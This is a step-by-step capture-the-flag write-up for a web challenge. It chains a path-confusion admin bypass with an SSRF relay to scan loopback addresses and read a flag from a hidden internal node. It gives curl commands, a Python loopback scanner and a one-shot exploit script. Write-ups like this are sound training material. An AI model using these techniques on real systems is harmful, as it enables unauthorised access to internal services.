# Cosmic Components Web CTF Writeup (Step by Step)

Known intel from PDF:

- Username: `AlexGoodwin`
- Password: `Pine123`
- Hint words: internal network, relay checks, stock queries.

> Note: we use burp suite for the but for the writeup we simulate on the curl

## Step Bypass Admin with path confusion

This path works:

- `http://194.102.62.175:27457//localhost/admin`

Curl version:

```bash
curl -i --path-as-is -b ctf_cookie.txt -c ctf_cookie.txt \
  "http://194.102.62.175:27457//localhost/admin"
```

Expected:

- `HTTP/1.1 200 OK`
- `Set-Cookie: relay_auth=...; Path=/admin`
- Admin page contains **Harbor Inventory Probe Console**

Why this matters:

- `/admin` trusts `relay_auth` cookie, which gets set by the `//localhost/admin` route.

---

## Use the Inventory Probe SSRF

From admin page, stock probe sends requests to:

- `POST /admin/relay`
- parameter: `inventory_node`

Default node values:

- `http://127.0.0.21:9100/inventory/stock/check?HarborId=1`
- `http://127.0.0.21:9100/inventory/stock/check?HarborId=2`
- `http://127.0.0.21:9100/inventory/stock/check?HarborId=3`
- `http://127.0.0.21:9100/inventory/stock/check?HarborId=4`

Test command:

```bash
curl -s -b ctf_cookie.txt -X POST "http://194.102.62.175:27457/admin/relay" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "inventory_node=http://127.0.0.21:9100/inventory/stock/check?HarborId=1"
```

Expected in HTML response:

- `Status: 200`
- JSON from internal service (`inventory-adapter`)

---

## Identify input validation behavior

Important validation discovered:

- Host must be **dotted decimal** IP.
- Host must stay in `127.0.0.1` to `127.0.0.254`.

Examples:

- `http://localhost:9100/` -> rejected (`Inventory node IP must be dotted decimal.`)
- `http://10.0.0.1:9100/` -> rejected (`Node IP must stay within 127.0.0.1-254.`)

So the relay is basically a loopback SSRF proxy with range restriction.

---

## Scan allowed loopback range

Because only 127.0.0.x is allowed, scan `127.0.0.1-254` on port `9100` via `/admin/relay`.

Quick Python scanner:

```python
import requests, re, html

base = "http://194.102.62.175:27457"
s = requests.Session()
s.cookies.set("session", "<SESSION_COOKIE>", domain="194.102.62.175", path="/")
s.cookies.set("relay_auth", "<RELAY_AUTH_COOKIE>", domain="194.102.62.175", path="/admin")

for i in range(1, 255):
    ip = f"127.0.0.{i}"
    node = f"http://{ip}:9100/"
    r = s.post(base + "/admin/relay", data={"inventory_node": node}, timeout=8)
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    if m:
        block = html.unescape(m.group(1))
        if "Status: 200" in block:
            print(ip, "LIVE")
```

Live nodes found:

- `127.0.0.21:9100` (known inventory service)
- `127.0.0.230:9100` (new internal node)

---

## Step Enumerate second internal node

Request:

- `inventory_node=http://127.0.0.230:9100/`

Response shows directory listing:

- `ops`
- `manifests`
- `drops`
- `logs`
- `notes.txt`

Follow listings recursively. The useful branch:

- `/drops/pacific/batch-44c/vault/sealed/flag`

---

## Read flag endpoint

Final command:

```bash
curl -s -b ctf_cookie.txt -X POST "http://194.102.62.175:27457/admin/relay" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "inventory_node=http://127.0.0.230:9100/drops/pacific/batch-44c/vault/sealed/flag"
```

Response contains:

- `Status: 200`
- `UVT{V3ry_W3ll_D0n3_MrP1n3_I_4m_1mpr3553d}`

---

## Final Flag

`UVT{V3ry_W3ll_D0n3_MrP1n3_I_4m_1mpr3553d}`

---

## One-Shot Reproduction

I imporovised a one-shot script to do all the steps in one go (I used Burp for the that but here is a curl version)

```bash
# 1) Login
curl -s -c ctf_cookie.txt -X POST "http://194.102.62.175:27457/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=AlexGoodwin&password=Pine123" > /dev/null

# 2) Get relay_auth through admin bypass path
curl -s --path-as-is -b ctf_cookie.txt -c ctf_cookie.txt \
  "http://194.102.62.175:27457//localhost/admin" > /dev/null

# 3) Pull flag from internal node
curl -s -b ctf_cookie.txt -X POST "http://194.102.62.175:27457/admin/relay" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "inventory_node=http://127.0.0.230:9100/drops/pacific/batch-44c/vault/sealed/flag"
```
